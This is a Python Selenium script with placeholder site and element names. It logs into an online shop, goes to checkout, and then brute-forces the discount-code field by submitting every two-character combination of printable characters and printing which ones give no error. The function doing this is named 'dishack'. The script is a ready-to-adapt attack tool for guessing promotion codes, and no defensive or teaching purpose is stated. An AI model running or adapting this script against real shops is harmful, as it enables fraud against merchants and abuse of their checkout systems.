from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
import sys
import itertools
from string import printable
import time

#select Firefox as the webrowser to use and defines it as driver

driver = webdriver.Firefox()
#navigates to url
driver.delete_all_cookies()
driver.get('http://CHOOSEAWEBSITE.COM')
time.sleep(10)

#defines credentials elements

username = driver.find_element_by_name('NAME')
password = driver.find_element_by_name('NAME')

#types credentials into HTML form and clicks subit

username.send_keys("USERNAME")
password.send_keys("PASSWORD")
driver.find_element_by_class_name('CLASSNAME').click()
time.sleep(30)

#Defines shopbag and wait for webdriver

shopbag = driver.find_element_by_xpath('XPATH')
wait = WebDriverWait(driver, 30)

#selects shopbag when it is visible in the DOM

wait.until(EC.visibility_of(shopbag))
shopbag.click()
time.sleep(5)

#tries to define and click on the checkout button once its unhidden, and retries with longer wait periods if it was unsuccessful

try:
	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('XPATH')))
	checkout.click()
except:
	time.sleep(15)
	shopbag = driver.find_element_by_xpath('XPATH')
	shopbag.click()
	time.sleep(15)
	checkout = wait.until(EC.visibility_of(driver.find_element_by_xpath('XPATH')))
	checkout.click()

#locates the discount entry form and defines it as discount

discount = driver.find_element_by_name('NAME')

# Makes an entry in the discount form and applies the entry
result = []
redone = [''.join(i) for i in itertools.product(printable, repeat = 2)]
result.append(redone)
def dishack():
	for f in sorted(set(redone)):
		discount = driver.find_element_by_name('NAME')
		discount.clear()
		discount.send_keys(f)
		driver.find_element_by_class_name('CLASSNAME').click()
		time.sleep(5)
		try:
			discounterror = driver.find_element_by_xpath('XPATH')	
			print 'Error'
		except:
			print 'No Error'	


dishack()
